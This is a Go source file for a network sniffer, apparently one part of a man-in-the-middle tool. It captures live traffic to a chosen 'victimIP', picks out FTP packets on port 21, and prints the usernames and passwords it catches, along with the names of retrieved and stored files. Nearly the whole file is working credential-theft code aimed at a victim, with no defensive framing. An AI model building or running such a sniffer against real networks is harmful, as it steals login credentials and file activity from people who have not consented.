package sniffer

import (
	"time"
	"fmt"
	"log"
	"strings"
	"errors"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
)

var (	
	snaplen int32 = 1024
	promisc bool  = false
	timeout time.Duration = pcap.BlockForever
)

/* 
 ** Loops through array of available interfaces on host,
 ** then chooses first one that is not loopback (lo0)
 */

func selectInterface() (pcap.Interface, error) {
	ifaces, err := pcap.FindAllDevs()
	if err != nil {
		return pcap.Interface{}, err
	}
	for _, iface := range ifaces {
		if iface.Name != "lo0" && iface.Name != "lo" {
			return iface, nil
		}
	}
	return pcap.Interface{}, errors.New("could not find valid network interface")
}

/*
 ** Filters TCP/FTP packets from rest of network,
 ** then prints only packets with Cred./File transfer FTP instructions
 */

func parseCaughtPacket(packet gopacket.Packet) {
	ipv6 := packet.Layer(layers.LayerTypeIPv6)
	if ipv6 != nil {
		return
	}
	transportLayer := packet.Layer(layers.LayerTypeTCP)

	if transportLayer != nil {
		tcp, _ := transportLayer.(*layers.TCP)
		appLayer := packet.ApplicationLayer()
		
		if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) {
			payload := strings.Split(string(appLayer.Payload()), " ")
			
			switch payload[0] {
			case "USER":
				fmt.Printf("[USER] Caught credentials: username %s", payload[1])
			case "PASS":
				fmt.Printf("[PASS] Caught credentials: password %s", payload[1])
			case "RETR":
				fmt.Printf("Client <--- Server: %s", payload[1])
			case "STOR":
				fmt.Printf("Client ---> Server: %s", payload[1])
			default:
				break
			}
		}
	}
}

/*
 ** Tunnel packets to initial destination,
 ** not to provoke an unintended DoS on client
 */

func Sniffer(victimIP string) {
	filter := "host " + victimIP
	iface, err := selectInterface()
	
	if err != nil {
		log.Fatal(err)
	}
	dev  := iface.Name
	handle, err := pcap.OpenLive(dev, snaplen, promisc, timeout)
	
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	
	fmt.Println("[ MONITORING NETWORK ]")
	for packet := range packetSource.Packets() {
		parseCaughtPacket(packet)
	}
}
